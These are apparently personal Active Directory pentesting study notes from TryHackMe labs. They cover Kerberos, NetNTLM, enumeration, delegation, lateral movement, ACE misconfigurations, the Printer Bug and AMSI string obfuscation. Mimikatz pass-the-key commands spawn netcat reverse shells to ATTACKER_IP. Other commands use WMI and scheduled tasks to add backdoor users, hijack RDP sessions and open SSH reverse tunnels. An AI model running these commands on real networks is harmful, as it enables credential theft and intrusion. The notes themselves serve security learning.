href="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%202.png"><img style="width:787px" src="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%202.png"/></a></figure><h1 id="899de4ac-ae2c-4cb0-85fd-a9661cc31fff" class="">Authentication</h1><ul id="c095af6a-b555-4ab6-8237-7237771025e6" class="bulleted-list"><li style="list-style-type:disc">credentials are stored in Domain Controller</li></ul><ul id="86346c98-378c-4d69-a68f-dde8b42d37f3" class="bulleted-list"><li style="list-style-type:disc">Domain Controller verifies user authentication</li></ul><p id="928560e2-c196-4e55-a57e-75a632d0b7a6" class="">Two protocols for authentication:</p><ol type="1" id="216bbc14-014b-4d0c-8f51-3183c92ab061" class="numbered-list" start="1"><li><span style="border-bottom:0.05em solid">Kerberos</span><ul id="b1d98dc1-49d4-434f-87c0-a4f08c4be169" class="bulleted-list"><li style="list-style-type:disc">Default protocol</li></ul></li></ol><ol type="1" id="acb267cb-da81-4698-96b5-c3c7fc9cd1b3" class="numbered-list" start="2"><li><span style="border-bottom:0.05em solid">NetNTLM</span><ul id="db670e27-1563-4d78-9ba9-30ae1bed3c0e" class="bulleted-list"><li style="list-style-type:disc">Legacy</li></ul><ul id="80c61bf5-97f4-4d6e-a8eb-638792413663" class="bulleted-list"><li style="list-style-type:disc">Obsolete but typically enabled for compatibility with old clients and servers</li></ul></li></ol><h2 id="67d615d2-e21a-4e42-849f-163e51914d23" class="">Kerberos</h2><figure id="a210e46a-4eb8-49bf-954b-eb31dc606629" class="image"><a href="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%203.png"><img style="width:1047px" src="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%203.png"/></a></figure><figure id="c1a758f1-bf80-4022-bad1-113fed27a593" class="image"><a href="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%204.png"><img style="width:1049px" src="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%204.png"/></a></figure><figure id="25943a3c-34ae-4170-869f-6812282e9055" class="image"><a href="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%205.png"><img style="width:1029px" src="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%205.png"/></a></figure><ul id="ae9c232f-028e-4983-994d-1e012fcb2b3a" class="bulleted-list"><li style="list-style-type:disc">logged in users are assigned tickets<ul id="cec7411d-0e5c-4425-9049-39f8cd2c59e7" class="bulleted-list"><li style="list-style-type:circle">tickets are proof of previous authentication</li></ul></li></ul><ul id="13643afd-cc5a-4dd7-9f99-558bc636f989" class="bulleted-list"><li style="list-style-type:disc">when authenticating to a service (e.g. share, website, or database), ticket is used (sort of like how web uses auth tokens or cookies)</li></ul><p id="eba5a0ed-0506-4988-87cd-df3f8842665f" class="">Kerberos authentication process:</p><ol type="1" id="6ed33b4b-2698-42bc-b575-85ea6c2c5901" class="numbered-list" start="1"><li>Username and timestamp encrypted using password and sent to <strong>Key Distribution Center (KDC)</strong><ul id="19e068e8-7332-46f6-b729-3b0018cd21ca" class="bulleted-list"><li style="list-style-type:disc">KDC is responsible for creating Kerberos tickets</li></ul></li></ol><ol type="1" id="708d0b07-2067-4344-a539-ec614a0ae572" class="numbered-list" start="2"><li>KDC sends back a <strong>Ticket Granting Ticket (TGT)</strong> and <strong>Session Key</strong><ul id="96aff28a-50ba-4810-af10-98d6ad7df8e4" class="bulleted-list"><li style="list-style-type:disc">TGT allows user to request additional tickets to access specific services </li></ul><ul id="6bcc4e80-c8d5-470b-8d80-4f6a349ae3b6" class="bulleted-list"><li style="list-style-type:disc">TGT encrypted with krbtgt password hash to help prevent user from tampering its contents<ul id="72c3c952-6d76-4096-9d1f-a78992d83ec7" class="bulleted-list"><li style="list-style-type:circle">TGT contain session key, expiration date, and user’s IP address</li></ul></li></ul></li></ol><ol type="1" id="5eb7cd5a-f36f-409f-94b1-b365f44e6f69" class="numbered-list" start="3"><li>When user attempts to access a service, the KDC sends a <strong>Ticket Granting Service (TGS) </strong>and <strong>Service Session Key</strong> <ul id="03348d83-350b-4f0a-9fdf-4f77c0079548" class="bulleted-list"><li style="list-style-type:disc">TGS tickets only allow a user to access a specific service</li></ul><ul id="d91c1580-36d7-445f-b541-97f5bca352fb" class="bulleted-list"><li style="list-style-type:disc">user sends username and timestamp encrypted with their session key, and also sends their TGT, and <strong>Service Principal Name (SPN)</strong><ul id="1c396f3e-a312-4444-bd1e-856f9707d3ec" class="bulleted-list"><li style="list-style-type:circle">SPN is service and server name user wants to access</li></ul></li></ul><ul id="a4f13ff2-ea34-4356-80ae-ba1e01e64d97" class="bulleted-list"><li style="list-style-type:disc">TGS encrypted with key derived from the Service Owner Hash<ul id="c536a12e-02f5-4818-8744-09ba525b5654" class="bulleted-list"><li style="list-style-type:circle">Service owner is user or machine that manages the service</li></ul></li></ul></li></ol><h3 id="cb503efd-0e1a-4634-8a7c-5b68dcea404b" class="">Overpass-the-Hash / Pass-the-Key</h3><ul id="0117ebb3-4425-481a-b60d-fcda6a366dff" class="bulleted-list"><li style="list-style-type:disc">when a user requests a TGT, a timestamp encrypted with key derived from password is used<ul id="bc33d6b7-b937-4ab7-82a4-57fcdd998be0" class="bulleted-list"><li style="list-style-type:circle">encrypted uses either DES (disabled by default on current Windows versions), RC4, AES128, or AES256</li></ul></li></ul><ul id="2d06e5ac-1899-4b2d-b1a2-22520cce38b4" class="bulleted-list"><li style="list-style-type:disc">can request KDC for TGT with just having the key and not the user’s password</li></ul><p id="bdceea2a-3e9f-4ace-8a01-8b0dfdab35b2" class=""><span style="border-bottom:0.05em solid">Obtaining Kerberos Encryption Keys</span></p><pre id="3a22f1f7-d697-4083-a9c5-a2cfa7cf5324" class="code code-wrap"><code>mimikatz# privilege::debug
mimikatz# sekurlsa::ekeys</code></pre><p id="29e30e8d-472e-4560-9f87-b98275b912db" class=""><strong>Getting Reverse Shell with Encryption Key</strong></p><p id="8476f5a4-3bea-4066-bea9-736da6763816" class=""><span style="border-bottom:0.05em solid">RC4</span></p><p id="3490bcde-51f6-4e06-ae7d-6b480c573cf4" class=""><code>mimikatz </code><code><strong>#</strong></code><code> sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</code></p><ul id="703f0fd9-21ec-476c-b104-798ec7e1a715" class="bulleted-list"><li style="list-style-type:disc">note that RC4 simply uses the user’s NTLM hash</li></ul><p id="508eb3f2-8607-4802-9775-c93c7b35761a" class=""><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid">AES128
</span></span></span></span></span></span></span><code>mimikatz </code><code><strong>#</strong></code><code> sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</code></p><p id="ec30c358-57c0-4b5a-a7da-050a26a0a0a2" class=""><span style="border-bottom:0.05em solid">AES256</span></p><p id="0336c88f-4cd6-450e-b1f3-cbc352de2545" class=""><code>mimikatz </code><code><strong>#</strong></code><code> sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;</code></p><p id="2e04047c-6c5b-4591-902e-de4025a763e8" class="">
</p><h2 id="30430466-8e92-4794-98f5-3f352359f5ce" class="">NetNTLM </h2><figure id="f2bfeac0-c943-4bdb-831c-4bf122d20caf" class="image"><a href="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%206.png"><img style="width:1051px" src="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%206.png"/></a></figure><ul id="8e700a25-3cb5-40cb-9351-38affeaaaacc" class="bulleted-list"><li style="list-style-type:disc">uses challenge-response methodology</li></ul><ul id="b6c23c45-f320-4244-8123-f6bba9c9eaa4" class="bulleted-list"><li style="list-style-type:disc">can perform Pass-the-Hash (PtH) attacks</li></ul><p id="bd614a98-0e94-416c-9e6e-34d71aa94088" class=""><span style="border-bottom:0.05em solid">Domain Account</span></p><ol type="1" id="07b3b94d-842f-43e2-ac45-67d12d9edbcc" class="numbered-list" start="1"><li>Client attempts to access service</li></ol><ol type="1" id="0b2f0c7c-af1b-44af-b821-e4c80f8f78d6" class="numbered-list" start="2"><li>Server responds with a random number (challenge)</li></ol><ol type="1" id="82670c07-bae2-466a-b914-df8c8956739f" class="numbered-list" start="3"><li>Client encrypts challenge with password hash</li></ol><ol type="1" id="524e0816-3508-43bb-bfbf-7a52afd222e7" class="numbered-list" start="4"><li>Server forwards response to Domain Controller</li></ol><ol type="1" id="15c0b295-8170-4c4d-9a8d-b987b7bae130" class="numbered-list" start="5"><li>Domain Controller also encrypts challenge with user’s password hash and compares if the output is the same</li></ol><ol type="1" id="637d3559-c2e1-4543-9cb2-33b435dc7b61" class="numbered-list" start="6"><li>If the output is the same access granted, otherwise denied</li></ol><p id="8c4d2ecb-3140-4403-8ffc-43c2a4c05973" class=""><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid"><span style="border-bottom:0.05em solid">Local Account</span></span></span></span></span></span></span></span></span></span></span></span></span> </p><p id="b7eff648-d7f3-4cbb-a6fe-540d801f7714" class="">For local accounts no need to contact Domain Controller as the passwords are stored locally in the Security Account Manager (SAM) hive</p><h2 id="df083491-75af-466f-8d86-77a0b41a6fd3" class="">LDAP</h2><ul id="77143d7d-8c01-4998-8b69-28824cce1f5b" class="bulleted-list"><li style="list-style-type:disc">application verifies user credentials (instead of DC)</li></ul><ul id="bb289754-0944-454e-9d52-88fb09ba9b78" class="bulleted-list"><li style="list-style-type:disc">common with third-party applications <ul id="d12784f0-f0a9-44e6-82d5-661f391e6404" class="bulleted-list"><li style="list-style-type:circle">GitHub</li></ul><ul id="5b6f5686-e1e9-45ad-9be4-dda8a6ef5533" class="bulleted-list"><li style="list-style-type:circle">Jenkins</li></ul><ul id="f6013d46-a9bb-44aa-b2d9-c6b30528d5e8" class="bulleted-list"><li style="list-style-type:circle">Printers</li></ul><ul id="d8c71e29-4cc1-48a1-8de8-e467db7c95c9" class="bulleted-list"><li style="list-style-type:circle">VPNs</li></ul></li></ul><figure id="02a84fcd-7a72-44de-b6c3-059d2f3847b3" class="image"><a href="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%207.png"><img style="width:1434px" src="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%207.png"/></a></figure><h1 id="65f936de-132b-4343-a6cb-fe86c9c2064b" class="">Enumeration</h1><ul id="54981f47-c6b4-4ec8-9b0b-0443a5a85a03" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> is great for enumeration</li></ul><ul id="c2bfd9e2-78a6-447b-bc8f-569a30ad6481" class="bulleted-list"><li style="list-style-type:disc"></li></ul><p id="6732cda0-d7bc-4710-b36b-028f92d1417f" class=""><span style="border-bottom:0.05em solid">Manual enumeration commands</span></p><table id="677dc83a-596c-48f5-a4fa-2e6d36bfce72" class="simple-table"><tbody><tr id="5217b92c-c1e7-4894-8fb9-56585e6b73ce"><td id="ScGE" class="" style="width:220.00000762939453px"><strong>Command</strong></td><td id="BR}_" class="" style="width:486.00000762939453px"><strong>Description</strong></td></tr><tr id="b4dbe27d-b3de-4b13-9d45-af6ce0f68f03"><td id="ScGE" class="" style="width:220.00000762939453px"><code>net user /domain</code></td><td id="BR}_" class="" style="width:486.00000762939453px">Find all users in a domain</td></tr><tr id="8f5d569a-db1d-42ab-8d42-b62a4704fb31"><td id="ScGE" class="" style="width:220.00000762939453px"><code>net group /domain</code></td><td id="BR}_" class="" style="width:486.00000762939453px">List all groups in domain</td></tr><tr id="ceb6e862-3c50-42d0-93c0-927ae1488e2b"><td id="ScGE" class="" style="width:220.00000762939453px"><code>net group &lt;GROUP_NAME&gt; /domain</code></td><td id="BR}_" class="" style="width:486.00000762939453px">List members of group</td></tr><tr id="2a8d51fd-bbd1-47b3-a057-5e54141e0ee7"><td id="ScGE" class="" style="width:220.00000762939453px"><code>net accounts /domain</code></td><td id="BR}_" class="" style="width:486.00000762939453px">Enumerate password policy of domain</td></tr></tbody></table><ul id="7644b764-3425-4ca8-8c80-867bef0ab549" class="bulleted-list"><li style="list-style-type:disc">note that the <code>net</code> command defaults to the <code>WORKGROUP</code> domain if the workstation is not domain-joined</li></ul><ul id="b487cfa0-ddc0-4daf-8e5d-773c8fc330be" class="bulleted-list"><li style="list-style-type:disc">output of <code>net</code> command may be trimmed</li></ul><ul id="26a4993f-097f-4302-92bb-1f6f8b1769ee" class="bulleted-list"><li style="list-style-type:disc">PowerShell cmdlets: <a href="https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps">https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps</a></li></ul><p id="d908e0a9-feb3-4f4b-a472-d7a3e81f0085" class="">
</p><h1 id="610e2297-43d5-431d-abe6-73f4ada11a65" class="">Delegation</h1><h2 id="4e6c85b7-ce72-4620-8c09-26b478bbf52e" class="">Unconstrained Delegation</h2><ul id="7d1ef1f1-73ef-4669-a25f-2c08bbe057e3" class="bulleted-list"><li style="list-style-type:disc">original insecure method of delegation (replaced by constrained delegation in 2003)</li></ul><ul id="3463dc48-f648-49fd-8d39-100da5f572cb" class="bulleted-list"><li style="list-style-type:disc">can force user to authenticate to malicious host to intercept the TGT and therefore impersonate the user</li></ul><h2 id="3a9af721-e1be-4e61-b966-af3c80c7fb7c" class="">Constrained Delegation</h2><ul id="3a940ab9-73a4-4c9c-b232-1f25088c2386" class="bulleted-list"><li style="list-style-type:disc">introduced in 2003</li></ul><ul id="9e4a4f0c-4c01-4dd2-8048-9e5eedd8de3a" class="bulleted-list"><li style="list-style-type:disc">restricts service account to services they are allowed to access</li></ul><h2 id="e890f38e-232d-4855-8ee5-84e401edd3e1" class="">Resource-Based Constrained Delegation</h2><ul id="94a78847-20c1-454f-a064-3b9a7f78cfc6" class="bulleted-list"><li style="list-style-type:disc">introduced in 2012</li></ul><ul id="40768e72-4bc6-466b-ac4f-db18fad0adc8" class="bulleted-list"><li style="list-style-type:disc">access to a resource is specified on the resource itself rather than the service account<ul id="f52df2f0-9255-434a-b01b-f1631715ea4a" class="bulleted-list"><li style="list-style-type:circle"> the service specifies who can delegate to it</li></ul></li></ul><p id="57188451-77f2-4175-88d1-e346a9fd337a" class="">
</p><h1 id="906fd3c0-8ba1-42e0-a49a-a7c567e2040d" class="">Privilege Escalation</h1><h2 id="00888bb5-8f80-4878-aada-5231850d9443" class="">Lateral Movement</h2><ul id="69f08d3a-081f-4515-ac42-f243027a329e" class="bulleted-list"><li style="list-style-type:disc">lateral movement typically done via WinRM, RDP, VNC, or SSH</li></ul><ul id="532fde23-cb60-496e-9e83-d8a2d61d4567" class="bulleted-list"><li style="list-style-type:disc">to stay stealthy avoid strange connections from one workstation to another (e.g. accessing code repository as a user who is part of the Marketing OU)</li></ul><h3 id="2d875865-8541-4b91-a9d1-26abe8dbd648" class="">Service</h3><ul id="1818a120-ce7c-40c4-badf-bb5572cd3acd" class="bulleted-list"><li style="list-style-type:disc">create service on other workstation with a malicious binary and start the service</li></ul><pre id="6c26cff3-5f0e-4579-a865-2cb336cbf352" class="code"><code>sc.exe \\TARGET create malicious_service binPath= &quot;/path/to/reverse_shell.exe&quot; start= auto
sc.exe \\TARGET start malicious_service</code></pre><h3 id="ebc20035-3771-4954-a96a-aae70996e153" class="">Windows Management Implementation (WMI)</h3><ul id="ccaf7a29-6a85-4ac7-affa-dc05632be46b" class="bulleted-list"><li style="list-style-type:disc">session can be established either through <strong>DCOM </strong>(ports 135 and 49152-65535) or <strong>Wsman </strong>(port 5985 or 5986)</li></ul><ul id="ce3bee55-d8a6-435f-a20e-83486805b101" class="bulleted-list"><li style="list-style-type:disc">outputs of commands are not seen by user when executing
</li></ul><p id="9e939b93-9f09-430c-a742-73936737c936" class=""><strong>Storing session</strong></p><pre id="e29e9af3-211f-4a74-92f6-57a57a23c63f" class="code code-wrap"><code>$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop</code></pre><p id="fa82621e-cc29-4d09-b39e-6dcd3f9c69ec" class="">
All the following methodologies require Administrator privileges:

<strong>Service Methodology
</strong><span style="border-bottom:0.05em solid">Creating Service Remotely with WMI</span></p><pre id="a69d84b6-d51b-45fb-a403-0ce5bead7aa3" class="code code-wrap"><code>Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = &quot;THMService2&quot;;
DisplayName = &quot;THMService2&quot;;
PathName = &quot;net user munra2 Pass123 /add&quot;; # Your payload
ServiceType = [byte]::Parse(&quot;16&quot;); # Win32OwnProcess : Start service in a new process
StartMode = &quot;Manual&quot;
}</code></pre><p id="ca65581a-4e35-4a1e-a152-687acb5056b8" class=""><span style="border-bottom:0.05em solid">Get Handle on Service and Starting It</span></p><pre id="af1c16d0-2f25-4572-907e-8f738b76e2a5" class="code code-wrap"><code>$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter &quot;Name LIKE &#x27;THMService2&#x27;&quot;

Invoke-CimMethod -InputObject $Service -MethodName StartService</code></pre><p id="d859b91d-d1b9-4084-88bd-bb9ec11df542" class="">
<strong>Scheduled Task Methodology</strong></p><pre id="49f578f6-da40-44f1-8ef2-6844b116ec35" class="code code-wrap"><code># Payload must be split in Command and Args
$Command = &quot;cmd.exe&quot;
$Args = &quot;/c net user 0xd4y PleaseSubscribe /add&quot;

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User &quot;NT AUTHORITY\SYSTEM&quot; -TaskName &quot;MyTask&quot;
Start-ScheduledTask -CimSession $Session -TaskName &quot;MyTask&quot;</code></pre><p id="a2d94d06-5728-4a9a-8456-8c2cec867cd8" class=""><strong>Installing MSI Package Methodology</strong></p><p id="73d3ad7d-44d0-4ad4-9538-30f2cbbd3ec1" class="">After copying MSI file to targeted remote system run the following command to install the package.</p><pre id="b1916849-7878-4327-b565-dcd11369493b" class="code"><code>Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = &quot;C:\Windows\myinstaller.msi&quot;; Options = &quot;&quot;; AllUsers = $false}</code></pre><h3 id="217e8876-673c-45a9-94b0-a56794e83c0d" class="">RDP Hijacking</h3><ul id="e2862f8e-462c-4b7a-aac5-ebe2ba404c46" class="bulleted-list"><li style="list-style-type:disc">SYSTEM user on Windows Server 2016 does not require a password, but Windows Server 2019 does</li></ul><ul id="d3434424-e30f-46c3-bc73-17ef6cae307d" class="bulleted-list"><li style="list-style-type:disc">when user connects via RDP and closes their client but not log out, their session is still active</li></ul><ul id="14984a13-b38b-4ec8-8818-0b56a79c51e3" class="bulleted-list"><li style="list-style-type:disc">use <code>query user</code> to find sessions on machine<ul id="5a2c123d-fff6-48e5-a100-7d661a28e2d4" class="bulleted-list"><li style="list-style-type:circle">unused active sessions identified by <code>Disc</code> state</li></ul></li></ul><ul id="5aa5c69f-b469-45c3-8680-218325b850af" class="bulleted-list"><li style="list-style-type:disc">connect to session using <code>tscon &lt;SESSION_ID&gt; /dest:&lt;SESSIONNAME&gt;</code></li></ul><figure id="cbf0a186-f59b-4db5-a3e0-19e254be7752" class="image"><a href="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%208.png"><img style="width:582px" src="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%208.png"/></a></figure><h3 id="624fe4eb-3732-426f-b686-fc70916c5195" class="">Remote Port Forwarding</h3><ol type="1" id="42b2a14c-5ba0-449f-87a5-bba7008c8001" class="numbered-list" start="1"><li>Create a user on attack box without console access:</li></ol><pre id="bf7c6e3d-f5c4-4fa9-9bc3-5c6a18788922" class="code code-wrap"><code>useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser</code></pre><ol type="1" id="bad6d0e0-2218-4d0a-8347-7c0f6dd7a5ed" class="numbered-list" start="2"><li>Forward RDP port (or whatever port it may be) to attack box:</li></ol><pre id="ff090109-ba27-46cd-a677-d747287391af" class="code"><code>ssh tunneluser@&lt;ATTACKER_IP&gt; -R 3389:&lt;RDP_MACHINE&gt;:3389 -N</code></pre><p id="95980b3d-457c-46a5-b47b-7d59ff212342" class="">
</p><p id="14b16981-630a-460e-8a71-f3cd8548a731" class="">
</p><h2 id="7e463bf9-0e3e-4d6e-9556-e2f5890f00d4" class="">Common Misconfigurations</h2><h3 id="07303d01-b9e5-41fb-b5ee-b5a44b8c7297" class="">Access Control Entry (ACE)</h3><ul id="4aaff48c-502f-4eed-945b-f5ccee56c499" class="bulleted-list"><li style="list-style-type:disc">element in an access control list (ACL)</li></ul><ul id="ff770791-9949-4e9e-977a-b3b2cb2cd44b" class="bulleted-list"><li style="list-style-type:disc">ACEs is a permission granted to control or monitor access to an object</li></ul><ul id="369312d5-01c7-477c-a64f-895a5509f7ea" class="bulleted-list"><li style="list-style-type:disc">can often be misconfigured and grant too much access</li></ul><p id="0565a490-fea6-4a09-ab3a-22de3722b8ac" class=""><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Common ACEs</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><table id="6bfa1a7e-60b1-43b4-9bb2-2cd87031279e" class="simple-table"><tbody><tr id="707e9e14-dc06-4b67-b8be-1fffd781604c"><td id="`BH[" class="" style="width:226.00000762939453px"><strong>ACE</strong></td><td id="Q[?J" class="" style="width:482px"><strong>Description</strong></td></tr><tr id="28047eb2-bbb9-4e78-9a63-d440447b9cc7"><td id="`BH[" class="" style="width:226.00000762939453px"><em>ForceChangePassword</em></td><td id="Q[?J" class="" style="width:482px">Set user’s password without needing current password</td></tr><tr id="2db71118-b28c-4568-8d70-176026940453"><td id="`BH[" class="" style="width:226.00000762939453px"><em>AddMembers</em></td><td id="Q[?J" class="" style="width:482px">Add user to group (including own user)</td></tr><tr id="d3dbfe2c-e215-4776-bbeb-9125d3bd79b1"><td id="`BH[" class="" style="width:226.00000762939453px"><em>GenericAll</em></td><td id="Q[?J" class="" style="width:482px">Complete control over object including changing password</td></tr><tr id="96686880-1235-4540-b9a9-4693eefd9f54"><td id="`BH[" class="" style="width:226.00000762939453px"><em>GenericWrite</em></td><td id="Q[?J" class="" style="width:482px">Update parameters of object (could for example be used to change the <code>scriptPath</code> parameter of an object to execute a malicious script)</td></tr><tr id="9bb0c9af-3c0a-41cf-8738-e56f94d9816e"><td id="`BH[" class="" style="width:226.00000762939453px"><em>WriteOwner</em></td><td id="Q[?J" class="" style="width:482px">Change owner of target object</td></tr><tr id="fff47728-3854-40b6-9849-06a542b358de"><td id="`BH[" class="" style="width:226.00000762939453px"><em>WriteDACL</em></td><td id="Q[?J" class="" style="width:482px">Write new ACEs to target object’s DACL (Discretionary Access Control List - used to specify who can access a resource)</td></tr><tr id="04e7b3b7-1284-4c1c-af7e-da12323a3c12"><td id="`BH[" class="" style="width:226.00000762939453px"><em>AllExtendedRights</em></td><td id="Q[?J" class="" style="width:482px">Perform any action with extended rights on target object </td></tr></tbody></table><h2 id="1d7315d4-4129-4b4f-9e64-fb82e324b0c7" class="">Printer Bug</h2><ul id="520345c9-7496-42d9-a2b9-a3ee00f0b3a5" class="bulleted-list"><li style="list-style-type:disc">bug (called a feature by Microsoft) that allows domain user to force a target to authenticate to arbitrary host</li></ul><p id="06582275-f3c2-4481-b6bf-9454c999a625" class="">Can be exploited under the following conditions:</p><ol type="1" id="db2e1898-2585-4704-b29c-612e16a09498" class="numbered-list" start="1"><li>Have access to valid AD credentials.</li></ol><ol type="1" id="7d05622b-677f-4078-a5ba-c7a5384d62ce" class="numbered-list" start="2"><li>Have network connectivity to target SMB service.</li></ol><ol type="1" id="3c7d1816-fde4-4496-b61d-855be0cd19dd" class="numbered-list" start="3"><li>Target host has Print Spooler service running.<ul id="fe808dfd-e1b5-40f4-b24d-d23729ec82ac" class="bulleted-list"><li style="list-style-type:disc">check if service is running: <code>GWMI Win32_Printer -Computer &lt;TARGET_HOST&gt;</code> </li></ul><ul id="106ac5fc-8e63-44c6-95b9-94ecb78e660e" class="bulleted-list"><li style="list-style-type:disc">can also use: <code>Get-PrinterPort -ComputerName &lt;TARGET_HOST&gt;</code></li></ul></li></ol><ol type="1" id="77e1dd1c-bc15-4dff-8d0e-5b938ff04882" class="numbered-list" start="4"><li>Target host has SMB signing not enforced. <ul id="f29d5cb7-1575-468c-b397-ff462af3fcad" class="bulleted-list"><li style="list-style-type:disc">check if SMB signing is enforced: <code>nmap --script=smb2-security-mode -p445 &lt;TARGET_HOST&gt;</code></li></ul></li></ol><ul id="098c03a1-8004-4cd6-96f0-f3bb5512f93e" class="bulleted-list"><li style="list-style-type:disc">use <a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a> to exploit this bug</li></ul><p id="1279b549-2051-4a17-a176-d85e34e8e78a" class="">
</p><p id="d994271f-4d5f-4869-b29c-bdd9f3ce9e7b" class="">
</p><p id="745d3054-62d1-4e75-8fa8-2b350abeb58a" class="">
</p><p id="4fdb5ece-b7dc-4990-b416-acf9de00fbe6" class="">
</p><p id="f48bc625-00d3-4635-bade-224510fa448f" class="">
</p><h1 id="772274af-5905-438d-a1ef-242ead2d03af" class="">Detection</h1><ul id="27916f31-7c46-4ea7-ab3e-7f88bf1ac3d1" class="bulleted-list"><li style="list-style-type:disc">PowerShell typically monitored more than CMD</li></ul><h2 id="2ea75ca4-e438-4ff2-87a4-2ad634daa021" class="">AMSI </h2><ul id="4e69776b-bb21-4d39-b818-b4bfda1badec" class="bulleted-list"><li style="list-style-type:disc">checks signatures</li></ul><ul id="4cc8be15-25d2-4f84-b82e-3eeb2ccbe2c7" class="bulleted-list"><li style="list-style-type:disc">looks for weak strings such as <code>AmsiScanBuffer</code>, <code>amsiInitFailed</code>, <code>AmsiUtils</code>, etc.</li></ul><h3 id="ffa2d4b8-249c-4067-aac5-ce9e87b33247" class="">Obfuscation</h3><p id="70c0a520-299e-4847-8481-9cc04fc4014d" class=""><strong>String Concatenation</strong></p><ul id="efa5ee2a-186a-4002-806a-0f54e2e89690" class="bulleted-list"><li style="list-style-type:disc">concatenation of strings literals and strings constants occurs at compile-time (and not run-time)</li></ul><ul id="3d20210c-4ae5-4f1a-b99b-846a95ac6cf5" class="bulleted-list"><li style="list-style-type:disc">concatenation occurs at run-time for string variables</li></ul><table id="0cf36be7-e21b-4a68-9d4a-279fb7d220f3" class="simple-table"><tbody><tr id="46688ee6-c3c4-493f-91ce-b7c3d7f15ebb"><td id="&gt;JWq" class=""><strong>Concatenate</strong></td><td id=";NmV" class=""><strong>Reorder</strong></td><td id="BSAM" class=""><strong>Whitespace</strong></td></tr><tr id="0cabe359-988e-4701-9e55-a57fceba2681"><td id="&gt;JWq" class=""><code>(&#x27;0x&#x27;+&#x27;d4&#x27;+&#x27;y&#x27;)</code></td><td id=";NmV" class=""><code>(&#x27;{1}{0}&#x27;-f&#x27;d4y&#x27;,&#x27;0x&#x27;)</code></td><td id="BSAM" class=""><code>( &#x27;0x&#x27; +&#x27;d4&#x27; + &#x27;y&#x27;)</code></td></tr></tbody></table><p id="c0eac08d-b4bc-4866-b228-ccb6441feb92" class="">
</p><h1 id="23c63438-50fb-4dcf-a350-73f1160b780c" class="">Windows Security Features</h1><h2 id="7fa24d65-86aa-43a2-8d43-372590893945" class="">User Account Control (UAC)</h2><p id="e9982770-6901-4108-8cbd-f312ca020b78" class="">Access control that helps prevent malware from damaging a PC by running applications and tasks as a non-administrator account (unless specified to run as admin)</p><ul id="ad836908-a3b4-468d-9777-7b3af58e8a01" class="bulleted-list"><li style="list-style-type:disc">enabled by default but can be disabled</li></ul><p id="1032fd14-a85f-4120-bd3d-729fb3421fec" class=""><span style="border-bottom:0.05em solid">Two types of admins</span></p><ol type="1" id="0fe143ab-8cca-472d-9c0b-fc27da623277" class="numbered-list" start="1"><li>Local account part of local Administrators group (not including built-in Administrator account)<ul id="875629b9-d3db-48fc-91d8-0ab11ef34411" class="bulleted-list"><li style="list-style-type:disc">administrative tasks cannot be performed on a remote machine unless using RDP</li></ul></li></ol><ol type="1" id="b11e3f0e-005d-489a-b1cf-02d88f3079e5" class="numbered-list" start="2"><li>Domain account part of local Administrators group<ul id="9ab999f2-bf54-40a8-a5d5-29854ce4ccf4" class="bulleted-list"><li style="list-style-type:disc">administrative tasks can be performed remotely even if not connecting through RDP</li></ul></li></ol><h2 id="48e63050-b6a4-4ced-a5a2-ad2fcbc284d1" 